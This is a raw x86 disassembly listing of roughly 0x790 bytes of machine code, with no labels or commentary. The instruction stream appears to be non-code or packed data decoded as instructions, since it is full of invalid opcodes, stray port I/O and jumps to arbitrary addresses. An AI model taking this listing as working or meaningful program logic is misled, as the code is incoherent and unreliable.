  41dea0:	mov    ds:0xf195af03,al
  41dea5:	ins    BYTE PTR es:[edi],dx
  41dea6:	push   ds
  41dea7:	mov    edx,0x1b41d665
  41deac:	aaa    
  41dead:	sub    ah,BYTE PTR [eax]
  41deaf:	mov    dl,cl
  41deb1:	popa   
  41deb2:	cmp    BYTE PTR [eax-0x297433b2],ah
  41deb8:	mov    ebp,0x87c626ed
  41debd:	jg     0x41de9b
  41debf:	jmp    0x41defb
  41dec1:	loop   0x41de7a
  41dec3:	inc    eax
  41dec5:	(bad)  
  41dec6:	mov    bl,0x3
  41dec8:	xrelease xchg BYTE PTR ds:0xf4346b79,bh
  41decf:	dec    ecx
  41ded0:	shl    BYTE PTR [eax+0x21],1
  41ded3:	mov    dh,0xe
  41ded5:	jecxz  0x41decb
  41ded7:	adc    eax,0x7689c5fc
  41dedc:	mov    edx,0xf0f02d8e
  41dee1:	inc    esi
  41dee2:	mov    ch,0x18
  41dee4:	push   ecx
  41dee5:	or     eax,0xae3862a6
  41deea:	adc    DWORD PTR [esi],esi
  41deec:	jmp    0xf34f:0xc952bf39
  41def3:	add    DWORD PTR [ecx],0xffffffa5
  41def6:	jle    0x41de97
  41def8:	push   ebp
  41def9:	mov    eax,ds:0xd9887af
  41defe:	stos   DWORD PTR es:[edi],eax
  41deff:	fadd   st,st(4)
  41df01:	fs div BYTE PTR es:[ebp-0x6e]
  41df06:	(bad)  
  41df07:	mov    al,BYTE PTR [esi+edi*4]
  41df0a:	stc    
  41df0b:	cmp    DWORD PTR [esi+ebp*4-0x1744972c],ecx
  41df12:	in     eax,dx
  41df13:	and    eax,0x48f20563
  41df18:	out    0x77,eax
  41df1a:	push   edi
  41df1b:	cld    
  41df1c:	xchg   esi,eax
  41df1d:	ss dec ebx
  41df1f:	mov    ah,0xe3
  41df21:	leave  
  41df22:	jl     0x41df8f
  41df24:	mov    ds,esi
  41df26:	xchg   edi,eax
  41df27:	sub    al,0x15
  41df29:	mov    al,ds:0x94963549
  41df2e:	stos   DWORD PTR es:[edi],eax
  41df2f:	in     al,0xe8
  41df31:	out    0x2e,al
  41df33:	mov    dh,0xa0
  41df35:	mov    ds:0x8892406c,al
  41df3a:	mov    ecx,0xc35e5103
  41df3f:	addr16 cmp al,0xfe
  41df42:	or     ax,0x1a83
  41df46:	daa    
  41df47:	scas   al,BYTE PTR es:[edi]
  41df48:	pop    ds
  41df49:	(bad)  
  41df4a:	loopne 0x41ded6
  41df4c:	pop    ss
  41df4d:	mov    ?,edx
  41df4f:	lods   al,BYTE PTR ds:[esi]
  41df50:	inc    edx
  41df51:	push   edi
  41df52:	std    
  41df53:	aam    0x48
  41df55:	push   edx
  41df56:	inc    esi
  41df57:	cwde   
  41df58:	fwait
  41df59:	jg     0x41dedb
  41df5b:	in     eax,dx
  41df5c:	inc    ecx
  41df5d:	shl    BYTE PTR [ebx+eiz*4],0x76
  41df61:	aad    0xf9
  41df63:	outs   dx,BYTE PTR ds:[esi]
  41df64:	jo     0x41dfb2
  41df66:	inc    eax
  41df67:	fnstcw WORD PTR [ecx]
  41df69:	jbe    0x41df94
  41df6b:	ror    eax,cl
  41df6d:	(bad)  
  41df6e:	adc    cl,bl
  41df70:	add    esp,esi
  41df72:	sbb    al,0xd5
  41df74:	xor    BYTE PTR [edi+0x63],0x85
  41df78:	pop    si
  41df7a:	nop
  41df7b:	inc    ebp
  41df7c:	popa   
  41df7d:	mov    ds:0xb27db6ed,al
  41df82:	(bad)  
  41df83:	pop    ebp
  41df84:	or     DWORD PTR [edi],ebx
  41df86:	rol    BYTE PTR [ecx],0xaf
  41df89:	cld    
  41df8a:	popf   
  41df8b:	loopne 0x41dfcb
  41df8d:	sub    dh,BYTE PTR [esi+ebp*1+0x72718191]
  41df94:	mov    ah,0x39
  41df96:	mov    BYTE PTR [ecx-0x55],cl
  41df99:	adc    ecx,DWORD PTR [edi]
  41df9b:	cdq    
  41df9c:	mov    ds:0x3fcab166,al
  41dfa1:	jmp    0xc042519a
  41dfa6:	xchg   BYTE PTR [eax-0x25237e1d],al
  41dfac:	jp     0x41df53
  41dfae:	xchg   esp,eax
  41dfaf:	fucomi st,st(3)
  41dfb1:	icebp  
  41dfb2:	pushf  
  41dfb3:	mov    al,ds:0x627fee63
  41dfb8:	adc    BYTE PTR [esi+0x7c25a6b9],bh
  41dfbe:	(bad)  
  41dfbf:	push   ecx
  41dfc0:	sbb    edi,DWORD PTR ds:0xbe7bb631
  41dfc6:	jb     0x41e020
  41dfc8:	add    al,0x84
  41dfca:	mov    ecx,0x6a5674d2
  41dfcf:	mov    bh,0x5d
  41dfd1:	aaa    
  41dfd2:	push   ss
  41dfd3:	std    
  41dfd4:	shl    bh,0x22
  41dfd7:	push   eax
  41dfd8:	adc    ah,al
  41dfda:	fdivr  QWORD PTR [esi-0x7b]
  41dfdd:	fwait
  41dfde:	or     al,0x37
  41dfe0:	cdq    
  41dfe1:	outs   dx,DWORD PTR ds:[esi]
  41dfe2:	loope  0x41df7a
  41dfe4:	stc    
  41dfe5:	loope  0x41dfd1
  41dfe7:	push   edx
  41dfe8:	jle    0x41e002
  41dfea:	pop    eax
  41dfeb:	in     al,dx
  41dfec:	mov    ch,0xe6
  41dfee:	mov    ch,0xb6
  41dff0:	mov    dh,0x31
  41dff2:	xor    DWORD PTR [esi-0x66],esi
  41dff5:	push   esp
  41dff6:	inc    al
  41dff8:	mov    al,ds:0xc500ed9b
  41dffd:	ret    
  41dffe:	fldenv [edx+0x63]
  41e001:	push   0x91aa121f
  41e006:	sub    eax,0xa89f07c2
  41e00b:	imul   BYTE PTR [ebx+0x62]
  41e00e:	mov    ch,BYTE PTR [eax-0x2124d0e5]
  41e014:	sbb    dh,cl
  41e016:	scas   al,BYTE PTR es:[edi]
  41e017:	ins    DWORD PTR es:[edi],dx
  41e018:	cmpxchg DWORD PTR [edi],eax
  41e01b:	sub    eax,0xa7394a23
  41e020:	in     eax,0x8e
  41e022:	lahf   
  41e023:	pop    ds
  41e024:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e025:	jg     0x41e019
  41e027:	in     al,0x58
  41e029:	cmp    eax,0xd163ff01
  41e02e:	jo     0x41e017
  41e030:	call   0x1fd3b445
  41e035:	(bad)  
  41e036:	push   0x2
  41e038:	stc    
  41e039:	inc    edx
  41e03a:	mov    esp,0x28efc409
  41e03f:	sub    eax,0x658e8cd0
  41e044:	cmp    ebx,esi
  41e046:	cmc    
  41e047:	inc    ecx
  41e048:	fwait
  41e049:	dec    esp
  41e04a:	pop    ebx
  41e04b:	mov    ds:0xb9fb5eff,al
  41e050:	inc    edx
  41e051:	leave  
  41e052:	dec    esp
  41e053:	sub    bl,al
  41e055:	xchg   edx,eax
  41e056:	lds    ebp,FWORD PTR [edx-0x61a4a597]
  41e05c:	ins    DWORD PTR es:[edi],dx
  41e05d:	jae    0x41e091
  41e05f:	mov    ds:0x433d89a1,al
  41e064:	nop
  41e065:	ret    
  41e066:	ror    al,cl
  41e068:	jecxz  0x41e089
  41e06a:	dec    esp
  41e06b:	and    DWORD PTR [edx+eiz*4+0x6d],eax
  41e06f:	mov    ebx,0x9696e25c
  41e074:	xor    edx,eax
  41e076:	pop    eax
  41e077:	add    eax,0x3a551915
  41e07c:	in     al,dx
  41e07d:	dec    ebp
  41e07e:	outs   dx,BYTE PTR ds:[esi]
  41e07f:	mov    ds:0xf965a308,al
  41e084:	inc    ebx
  41e085:	ret    0x192
  41e088:	in     eax,dx
  41e089:	fucomp st(0)
  41e08b:	div    BYTE PTR [ebx-0x29]
  41e08e:	outs   dx,DWORD PTR ds:[esi]
  41e08f:	mov    ds:0xc8eea751,al
  41e094:	inc    eax
  41e095:	cmp    bl,BYTE PTR [ebx+0x67]
  41e098:	add    BYTE PTR [ecx+0x514b433d],dh
  41e09e:	push   cs
  41e09f:	mov    eax,0xea4cdc63
  41e0a4:	sbb    BYTE PTR [eax+0x4aa8ad7b],bl
  41e0aa:	cs mov dl,0xc3
  41e0ad:	adc    BYTE PTR [edi],bh
  41e0af:	ins    BYTE PTR es:[edi],dx
  41e0b0:	inc    ecx
  41e0b1:	inc    ebp
  41e0b2:	cwde   
  41e0b3:	adc    eax,0xf15bc28f
  41e0b8:	or     eax,0x679efc2c
  41e0bd:	add    ah,bl
  41e0bf:	ficom  WORD PTR [ecx-0x204be17a]
  41e0c5:	push   ds
  41e0c6:	sahf   
  41e0c7:	cmp    edx,DWORD PTR [edi+0x2f7c6c73]
  41e0cd:	jb     0x41e09e
  41e0cf:	bound  esi,QWORD PTR ds:0x47b6d03c
  41e0d5:	or     BYTE PTR [edi-0x30],0xbe
  41e0d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0da:	push   ecx
  41e0db:	sti    
  41e0dc:	jb     0x41e110
  41e0de:	out    dx,eax
  41e0df:	inc    eax
  41e0e0:	test   al,0x81
  41e0e2:	je     0x41e151
  41e0e4:	mov    WORD PTR [edi-0x80],ds
  41e0e7:	jno    0x41e06d
  41e0e9:	pop    es
  41e0ea:	imul   edx,ebp,0x7e109c3e
  41e0f0:	jl     0x41e129
  41e0f2:	fwait
  41e0f3:	fs xchg ecx,eax
  41e0f5:	js     0x41e0e4
  41e0f7:	add    cl,BYTE PTR [esi-0x42b9bf10]
  41e0fd:	push   ss
  41e0fe:	popf   
  41e0ff:	ror    DWORD PTR [ecx],cl
  41e101:	lods   al,BYTE PTR ds:[esi]
  41e102:	int    0x7d
  41e104:	mov    es,esp
  41e106:	test   BYTE PTR [ebx+esi*4+0x55],al
  41e10a:	pop    edi
  41e10b:	test   BYTE PTR [ecx],0xf3
  41e10e:	test   WORD PTR [ebx],bx
  41e111:	ja     0x41e123
  41e113:	pop    ds
  41e114:	imul   esp,DWORD PTR [ebx-0x4b],0x548761fe
  41e11b:	push   ebx
  41e11c:	xchg   esi,eax
  41e11d:	push   eax
  41e11e:	paddw  mm0,QWORD PTR es:[eax+0x134dfc60]
  41e126:	in     eax,0x68
  41e128:	push   ebp
  41e129:	sbb    ah,bl
  41e12b:	std    
  41e12c:	xchg   ebx,eax
  41e12d:	aaa    
  41e12e:	in     eax,dx
  41e12f:	or     eax,0x72714382
  41e134:	dec    edx
  41e135:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e136:	das    
  41e137:	popf   
  41e138:	fsub   DWORD PTR [eax-0x14f36acb]
  41e13e:	xchg   BYTE PTR [eax+0x3a00207],ah
  41e144:	js     0x41e173
  41e146:	xor    DWORD PTR [eax],ebx
  41e148:	shl    BYTE PTR [ebx+0x25efaad1],1
  41e14e:	jo     0x41e126
  41e150:	dec    esi
  41e151:	inc    eax
  41e152:	cli    
  41e153:	adc    DWORD PTR [edx-0x76],edi
  41e156:	xor    eax,0x5c9e14b3
  41e15b:	mov    ch,0x81
  41e15d:	into   
  41e15e:	cmc    
  41e15f:	mov    ebx,DWORD PTR [ecx+eiz*2]
  41e162:	adc    BYTE PTR [esi-0x40d76578],bh
  41e168:	aaa    
  41e169:	xor    BYTE PTR [edi+eax*4],ah
  41e16c:	and    DWORD PTR [edx+0x3f1bee82],edx
  41e172:	call   0x8cebeba6
  41e177:	cmp    DWORD PTR [esi+0x4cc2d60b],eax
  41e17d:	and    BYTE PTR [ecx],bh
  41e17f:	les    eax,FWORD PTR [ecx-0x77]
  41e182:	or     ecx,edi
  41e184:	call   0x6fdd:0xf7cf3144
  41e18b:	add    BYTE PTR [edx-0x556ba1c6],0xff
  41e192:	loopne 0x41e1ec
  41e194:	push   cs
  41e195:	mov    ds:0xb2169a60,al
  41e19a:	out    0xfe,al
  41e19c:	or     edx,0x99c49e7e
  41e1a2:	push   cs
  41e1a3:	rol    DWORD PTR [ecx-0x10],cl
  41e1a6:	mov    esi,0x438ac5f7
  41e1ab:	sahf   
  41e1ac:	mov    edi,0x3000784e
  41e1b1:	lds    ecx,FWORD PTR [ebx-0x55]
  41e1b4:	mov    eax,ds
  41e1b6:	sbb    DWORD PTR [edi+0x32],esp
  41e1b9:	mov    ds:0xbfcf0356,eax
  41e1be:	push   sp
  41e1c0:	enter  0x55b8,0x4a
  41e1c4:	daa    
  41e1c5:	je     0x41e15e
  41e1c7:	cmp    DWORD PTR ds:[ecx-0x52ec4cb4],ecx
  41e1ce:	cmp    BYTE PTR [eax+0x11],dl
  41e1d1:	or     esp,DWORD PTR [ecx+0x3fd87e29]
  41e1d7:	sbb    DWORD PTR [ebx+0x385a1b6d],esi
  41e1dd:	xchg   edi,eax
  41e1de:	fisubr DWORD PTR [edx]
  41e1e0:	sbb    BYTE PTR [eax+0x38d73eb9],cl
  41e1e6:	jmp    0xc9cc:0x2b0afc60
  41e1ed:	sar    DWORD PTR [edx],0x41
  41e1f0:	das    
  41e1f1:	and    eax,0xe2c42e5a
  41e1f6:	push   esi
  41e1f7:	std    
  41e1f8:	les    eax,FWORD PTR [edi+0x27]
  41e1fb:	sub    eax,0x18d7c0ff
  41e200:	adc    dl,bh
  41e202:	add    BYTE PTR [ecx+ecx*4+0x28],al
  41e206:	mov    ?,WORD PTR [esi]
  41e208:	fadd   DWORD PTR [esi+edi*8+0x14]
  41e20c:	popf   
  41e20d:	or     DWORD PTR [eax],edi
  41e20f:	mov    ds:0xdb183f0a,al
  41e214:	test   eax,0x619855be
  41e219:	xor    BYTE PTR [ebp-0x7a],dh
  41e21c:	cmp    ebx,DWORD PTR [edx+0x374cce59]
  41e222:	inc    ecx
  41e223:	xchg   ebx,eax
  41e224:	push   ecx
  41e225:	ds xchg ecx,eax
  41e227:	mov    ebx,?
  41e229:	push   ebp
  41e22a:	pusha  
  41e22b:	mov    bl,0x6b
  41e22d:	shl    DWORD PTR [ecx],1
  41e22f:	inc    ecx
  41e230:	aas    
  41e231:	mov    al,cl
  41e233:	sahf   
  41e234:	popa   
  41e235:	jmp    0xb5917ef2
  41e23a:	sbb    ebp,DWORD PTR [eax]
  41e23c:	call   0xc4197946
  41e241:	push   cs
  41e242:	xchg   ecx,eax
  41e243:	ds adc eax,0xb6905c8e
  41e249:	mov    edi,0xb0a1ad3c
  41e24e:	mov    esp,0xd6e5dfc0
  41e253:	mov    esp,0xaac5ff8c
  41e258:	out    dx,al
  41e259:	xchg   edx,eax
  41e25a:	pop    ecx
  41e25b:	mov    cl,0xf5
  41e25d:	loopne 0x41e296
  41e25f:	pop    edi
  41e260:	pushf  
  41e261:	js     0x41e2a2
  41e263:	popf   
  41e264:	outs   dx,DWORD PTR ds:[esi]
  41e265:	add    bh,bh
  41e267:	inc    BYTE PTR [ecx-0x57]
  41e26a:	dec    ecx
  41e26b:	push   ss
  41e26c:	push   0x40ad6b26
  41e271:	inc    esi
  41e272:	in     al,0x14
  41e274:	div    BYTE PTR fs:[esp+esi*4+0x1c0b9d0b]
  41e27c:	ret    0x63c2
  41e27f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e280:	push   eax
  41e281:	lods   eax,DWORD PTR ds:[esi]
  41e282:	mov    cl,0xbe
  41e284:	mov    edx,eax
  41e286:	fild   QWORD PTR [ebx-0x58]
  41e289:	mov    WORD PTR [ebp+eiz*1-0x60836786],ds
  41e290:	cmp    BYTE PTR [edi+0xa],0x27
  41e294:	inc    ebp
  41e295:	mov    dh,0xd1
  41e297:	or     BYTE PTR [eax-0xe],0xad
  41e29b:	mov    ebp,0x90642d07
  41e2a0:	jo     0x41e265
  41e2a2:	or     DWORD PTR [esi+0x10],0xffffff9a
  41e2a6:	call   0x552a00b5
  41e2ab:	fsubr  QWORD PTR [edx+0x47c791e8]
  41e2b1:	pop    ds
  41e2b2:	and    al,BYTE PTR [edx-0x2e]
  41e2b5:	test   BYTE PTR [esi-0x69],bl
  41e2b8:	nop
  41e2b9:	shr    BYTE PTR [edi+0xf73d43c],1
  41e2bf:	(bad)  [eax]
  41e2c1:	stos   BYTE PTR es:[edi],al
  41e2c2:	jmp    0x41e26d
  41e2c4:	ds into 
  41e2c6:	ret    
  41e2c7:	push   0x68269394
  41e2cc:	fucom  st(2)
  41e2ce:	jp     0x41e277
  41e2d0:	stos   BYTE PTR es:[edi],al
  41e2d1:	imul   BYTE PTR [eax]
  41e2d3:	jp     0x41e2aa
  41e2d5:	push   ebp
  41e2d6:	clc    
  41e2d7:	dec    ecx
  41e2d8:	cdq    
  41e2d9:	pop    ds
  41e2da:	out    dx,al
  41e2db:	jb     0x41e2a8
  41e2dd:	xor    eax,ebp
  41e2df:	push   ecx
  41e2e0:	sub    ebx,DWORD PTR [ecx-0x453c25dc]
  41e2e6:	shl    DWORD PTR [ebx],cl
  41e2e8:	retf   
  41e2e9:	rol    DWORD PTR [eax+0x2bdd1f1e],1
  41e2ef:	outs   dx,BYTE PTR ds:[esi]
  41e2f0:	inc    esi
  41e2f1:	mov    DWORD PTR [ecx-0x6707afe7],ebx
  41e2f7:	push   eax
  41e2f8:	mov    ?,eax
  41e2fa:	idiv   BYTE PTR [ebx]
  41e2fc:	addr16 f2xm1 
  41e2ff:	in     eax,0xdf
  41e301:	sbb    dh,BYTE PTR [edx+ecx*8+0x48]
  41e305:	pop    ss
  41e306:	(bad)  
  41e308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e309:	jp     0x41e2fc
  41e30b:	push   ebx
  41e30c:	mov    edi,0xfc69d9ce
  41e311:	add    al,0x77
  41e313:	xchg   edx,eax
  41e314:	cmp    DWORD PTR [edx+0x4146dcc4],esi
  41e31a:	pop    esp
  41e31b:	jle    0x41e2c0
  41e31d:	test   BYTE PTR [ebp+0x4a],0xfe
  41e321:	lahf   
  41e322:	(bad)  
  41e323:	fdivr  QWORD PTR [esp+edi*2]
  41e326:	lock test DWORD PTR [ecx+0x5e871bcf],0x30c8f666
  41e331:	jmp    0x3e35:0xecfeffbe
  41e338:	test   DWORD PTR [ecx],edi
  41e33a:	push   esi
  41e33b:	call   0xb05922cd
  41e340:	mov    ebp,0xd905a40c
  41e345:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e346:	in     al,dx
  41e347:	pusha  
  41e348:	jbe    0x41e36a
  41e34a:	outs   dx,BYTE PTR ds:[esi]
  41e34b:	push   ecx
  41e34c:	push   ds
  41e34d:	loopne 0x41e2de
  41e34f:	cmc    
  41e350:	lods   eax,DWORD PTR fs:[esi]
  41e352:	stos   BYTE PTR es:[edi],al
  41e353:	jmp    0x41e3c1
  41e355:	scas   al,BYTE PTR es:[edi]
  41e356:	mov    esp,0x54204571
  41e35b:	shl    BYTE PTR [eax+0x42],cl
  41e35e:	dec    ebp
  41e35f:	xchg   ebx,eax
  41e360:	and    al,0x2
  41e362:	pop    ebx
  41e363:	call   0x5ea5174b
  41e368:	sti    
  41e369:	cmp    dl,BYTE PTR [esp+eax*2]
  41e36c:	not    bh
  41e36e:	mov    esi,0xba629d4f
  41e373:	sbb    edx,esp
  41e375:	mov    al,ds:0xd2439f79
  41e37a:	dec    eax
  41e37b:	(bad)  
  41e37c:	call   0xca7fb6d8
  41e381:	or     dh,ch
  41e383:	ret    0x7c38
  41e386:	fistp  QWORD PTR [ecx]
  41e388:	add    cl,bl
  41e38a:	cmp    cl,bl
  41e38c:	rol    BYTE PTR [esi-0x7],cl
  41e38f:	or     edi,DWORD PTR [eax+esi*4]
  41e392:	cwde   
  41e393:	in     eax,dx
  41e394:	aaa    
  41e395:	into   
  41e396:	retf   0xd08c
  41e399:	repz mov esp,0xc2699b48
  41e39f:	xor    DWORD PTR [ebx+0x23],esp
  41e3a2:	cmp    dh,ch
  41e3a4:	cs lahf 
  41e3a6:	jg     0x41e347
  41e3a8:	dec    esp
  41e3a9:	dec    esp
  41e3aa:	mov    DWORD PTR [edi],esp
  41e3ac:	and    eax,0x51f71ca3
  41e3b1:	mov    edx,0x5488e2b8
  41e3b6:	sbb    ebp,DWORD PTR [edx-0x51]
  41e3b9:	push   eax
  41e3ba:	ret    0xe7ba
  41e3bd:	ret    0x9079
  41e3c0:	repnz aam 0xf8
  41e3c3:	mov    edx,ebx
  41e3c5:	cmp    al,BYTE PTR [eax]
  41e3c7:	fnsave [esi-0x57]
  41e3ca:	push   es
  41e3cb:	push   ecx
  41e3cc:	push   ebp
  41e3cd:	int3   
  41e3ce:	sub    ah,BYTE PTR [eax+ecx*1+0x10]
  41e3d2:	inc    eax
  41e3d3:	push   ds
  41e3d4:	lods   eax,DWORD PTR ds:[esi]
  41e3d5:	scas   eax,DWORD PTR es:[edi]
  41e3d6:	mov    ?,WORD PTR [edx-0x327a57a1]
  41e3dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3dd:	xor    esp,esp
  41e3df:	int    0x7b
  41e3e1:	mov    DWORD PTR [ebp+eax*1-0x1140d27c],ecx
  41e3e8:	inc    ebx
  41e3e9:	or     eax,0x3fbba5dc
  41e3ee:	out    0xbe,al
  41e3f0:	mov    bl,0x98
  41e3f2:	adc    ah,al
  41e3f4:	lds    esi,FWORD PTR [ebp+edi*1-0x7e]
  41e3f8:	ds or  al,0x45
  41e3fb:	cmp    BYTE PTR [eax-0x32],cl
  41e3fe:	retf   
  41e3ff:	pushf  
  41e400:	les    esi,FWORD PTR [ebx+0x4290d942]
  41e406:	ret    
  41e407:	sbb    DWORD PTR [edi],0xfaf85f
  41e40d:	jnp    0x41e435
  41e40f:	sbb    al,0xfe
  41e411:	fwait
  41e412:	push   ss
  41e413:	(bad)
  41e416:	lods   al,BYTE PTR ds:[esi]
  41e417:	lahf   
  41e418:	adc    BYTE PTR [edi],cl
  41e41a:	retf   0x2c17
  41e41d:	mov    al,ds:0x6653fa59
  41e422:	sub    DWORD PTR [ebp+0xd528a50],0x53
  41e429:	jne    0x41e464
  41e42b:	bound  eax,QWORD PTR [edi-0x3e]
  41e42e:	push   0xf6d11e5f
  41e433:	std    
  41e434:	sbb    al,0x42
  41e436:	adc    ebp,edx
  41e438:	inc    esi
  41e439:	jnp    0x41e47f
  41e43b:	fild   WORD PTR [ebx-0x2b79102f]
  41e441:	adc    bh,BYTE PTR [ebp+0x5b5e32fb]
  41e447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e448:	jmp    0xf22d:0xc9fa977c
  41e44f:	rol    BYTE PTR [ebp+ebx*2-0x26b53c75],1
  41e456:	arpl   si,bx
  41e458:	sbb    eax,0xe4da001d
  41e45d:	stos   DWORD PTR es:[edi],eax
  41e45e:	push   ss
  41e45f:	ret    
  41e460:	lock cs retf 
  41e463:	or     edx,DWORD PTR [ecx-0x22]
  41e466:	lods   eax,DWORD PTR ds:[esi]
  41e467:	ins    DWORD PTR es:[edi],dx
  41e468:	repz jmp 0xa425:0xdfab8b44
  41e470:	lods   al,BYTE PTR ds:[esi]
  41e471:	pop    esi
  41e472:	mov    bl,0x79
  41e474:	sbb    al,0xb4
  41e476:	ret    0xfba9
  41e479:	sbb    DWORD PTR [ebx-0x3dca7e98],esp
  41e47f:	mov    ebx,0xe599070d
  41e484:	jp     0x41e4dd
  41e486:	icebp  
  41e487:	ret    
  41e488:	(bad)  
  41e489:	cdq    
  41e48a:	mov    eax,0xe8cfc8c9
  41e48f:	push   cs
  41e490:	loopne 0x41e427
  41e492:	mov    ah,BYTE PTR [ecx-0x4c]
  41e495:	xor    ecx,DWORD PTR [edx]
  41e497:	rcr    BYTE PTR [ebp-0x6c],1
  41e49a:	pop    esp
  41e49b:	push   ss
  41e49c:	outs   dx,DWORD PTR ds:[esi]
  41e49d:	jmp    0xdced98a7
  41e4a2:	ret    
  41e4a3:	add    eax,0x182eee5c
  41e4a8:	adc    DWORD PTR ds:0xe9900953,esi
  41e4ae:	adc    DWORD PTR [ebp+0x25],0x1a
  41e4b2:	xlat   BYTE PTR ds:[ebx]
  41e4b3:	fdiv   QWORD PTR [edx+eiz*4+0x6b]
  41e4b7:	out    dx,al
  41e4b8:	dec    esi
  41e4b9:	xlat   BYTE PTR ds:[ebx]
  41e4ba:	call   0xadd5700e
  41e4bf:	jno    0x41e457
  41e4c1:	mov    DWORD PTR [ebx+0x8c99364],ecx
  41e4c7:	leave  
  41e4c8:	cli    
  41e4c9:	jno    0x41e4f7
  41e4cb:	xchg   BYTE PTR [edi],dl
  41e4cd:	in     al,0x48
  41e4cf:	jne    0x41e4ca
  41e4d1:	jecxz  0x41e4a4
  41e4d3:	dec    eax
  41e4d4:	pop    ebx
  41e4d5:	inc    edi
  41e4d6:	aad    0xcb
  41e4d8:	popa   
  41e4d9:	and    eax,0xf8312569
  41e4de:	add    al,0xbb
  41e4e0:	aam    0xa5
  41e4e2:	daa    
  41e4e3:	pop    ss
  41e4e4:	jnp    0x41e546
  41e4e6:	popa   
  41e4e7:	push   0x34
  41e4e9:	add    al,0x6b
  41e4eb:	adc    BYTE PTR [esi-0x7e],bh
  41e4ee:	lods   al,BYTE PTR ds:[esi]
  41e4ef:	inc    edx
  41e4f0:	repnz mov ah,0x49
  41e4f3:	sub    eax,0xf596c571
  41e4f8:	sub    al,0x9d
  41e4fa:	pop    eax
  41e4fb:	ret    
  41e4fc:	mov    esi,edi
  41e4fe:	jp     0x41e565
  41e500:	push   esi
  41e501:	in     al,0xec
  41e503:	bound  esp,QWORD PTR ds:0x996f05e3
  41e509:	xor    DWORD PTR [edx-0x40],eax
  41e50c:	clc    
  41e50d:	ja     0x41e4a8
  41e50f:	cmp    ah,BYTE PTR [edi+0x51313523]
  41e515:	fwait
  41e516:	jmp    0x426d2dd
  41e51b:	imul   edi,DWORD PTR [ecx],0x7fe0dae0
  41e521:	add    eax,0xbc57332c
  41e526:	add    ebx,DWORD PTR [esp+edi*8+0x46510e8d]
  41e52d:	inc    ebx
  41e52e:	pop    eax
  41e52f:	adc    DWORD PTR [ebp+ebp*2+0x26],ecx
  41e533:	or     bl,BYTE PTR [eax-0x34371c9c]
  41e539:	jnp    0x41e4f0
  41e53b:	xchg   edi,edi
  41e53d:	lea    eax,[esi+ebx*4+0x3b]
  41e541:	lds    ebx,FWORD PTR [ecx]
  41e543:	dec    ecx
  41e544:	sbb    esi,ebp
  41e546:	test   eax,0x5c7e2ae2
  41e54b:	sub    eax,0xa89d3e8a
  41e550:	stos   DWORD PTR es:[edi],eax
  41e551:	pop    es
  41e552:	mov    edi,0x976fe79d
  41e557:	add    DWORD PTR [esi],edx
  41e559:	imul   esi,DWORD PTR [ebx],0xac86b538
  41e55f:	xchg   esp,eax
  41e560:	xchg   edi,eax
  41e561:	je     0x41e513
  41e563:	mov    ecx,0xfc093281
  41e568:	cld    
  41e569:	inc    esp
  41e56a:	(bad)  [ebx-0x3]
  41e56d:	cwde   
  41e56e:	ja     0x41e567
  41e570:	and    BYTE PTR [esi+edi*4+0x87d6aa1],ah
  41e577:	in     al,0xee
  41e579:	pop    ds
  41e57a:	mov    edi,0x3eb36a14
  41e57f:	in     eax,0xda
  41e581:	sub    al,0xce
  41e583:	jle    0x41e5cb
  41e585:	cmp    bh,BYTE PTR [ebp+0x67]
  41e588:	int3   
  41e589:	or     BYTE PTR [ebx],al
  41e58b:	and    al,0xf9
  41e58d:	into   
  41e58e:	or     DWORD PTR [ebp+0x2],esp
  41e591:	mov    esp,0xedce0102
  41e596:	scas   eax,DWORD PTR es:[edi]
  41e597:	repz pop ss
  41e599:	add    dh,BYTE PTR [esi-0x1a]
  41e59c:	adc    esi,DWORD PTR [ebx-0x6a17f60d]
  41e5a2:	retf   
  41e5a3:	mov    bl,0x3
  41e5a5:	stos   DWORD PTR es:[edi],eax
  41e5a6:	mov    esi,0xdbe50f7
  41e5ab:	fnstenv [ecx-0x3f]
  41e5ae:	rcr    DWORD PTR [ebx],0xc7
  41e5b1:	jg     0x41e5fe
  41e5b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5b4:	jbe    0x41e582
  41e5b6:	inc    ebx
  41e5b7:	xchg   BYTE PTR [edi+0x29],cl
  41e5ba:	sahf   
  41e5bb:	xchg   DWORD PTR [ebp+0x2f],edi
  41e5be:	sub    bh,BYTE PTR [edi-0x6be39ff5]
  41e5c4:	in     al,0x5c
  41e5c6:	mov    gs,WORD PTR [ecx+0x40c576a7]
  41e5cc:	outs   dx,BYTE PTR ds:[esi]
  41e5cd:	mov    ebx,0x32256a4e
  41e5d2:	and    esp,DWORD PTR [ecx-0x9777e06]
  41e5d8:	push   0xffffff8c
  41e5da:	sub    BYTE PTR [edx+0x13ce9b95],dh
  41e5e0:	scas   eax,DWORD PTR es:[edi]
  41e5e1:	mov    bl,0x5f
  41e5e3:	ret    0xd4e6
  41e5e6:	mov    bl,0xc1
  41e5e8:	xor    BYTE PTR [ebx],bl
  41e5ea:	sbb    al,0x54
  41e5ec:	js     0x41e667
  41e5ee:	adc    edi,DWORD PTR [edx]
  41e5f0:	jae    0x41e5e0
  41e5f2:	imul   esp,DWORD PTR [ebx-0x4b],0x70
  41e5f6:	xchg   esi,eax
  41e5f7:	jbe    0x41e62c
  41e5f9:	dec    esi
  41e5fa:	and    eax,0x56626c80
  41e5ff:	popa   
  41e600:	scas   eax,DWORD PTR es:[edi]
  41e601:	dec    eax
  41e602:	stos   BYTE PTR es:[edi],al
  41e603:	clc    
  41e604:	adc    eax,0xc962b4ec
  41e609:	jne    0x41e643
  41e60b:	mov    cl,0xfd
  41e60d:	cmp    ch,ah
  41e60f:	pop    esi
  41e610:	add    DWORD PTR [ebx],0x445d84df
  41e616:	inc    edx
  41e617:	sbb    eax,0x74cfe586
  41e61c:	mov    esp,0x32798660
  41e621:	outs   dx,DWORD PTR ds:[esi]
  41e622:	cmc    
  41e623:	fist   DWORD PTR [eax]
  41e625:	mov    ecx,0x78aed8e2
  41e62a:	mov    eax,ds:0x56cad468
  41e62f:	dec    esi
  41e630:	sub    al,0x59
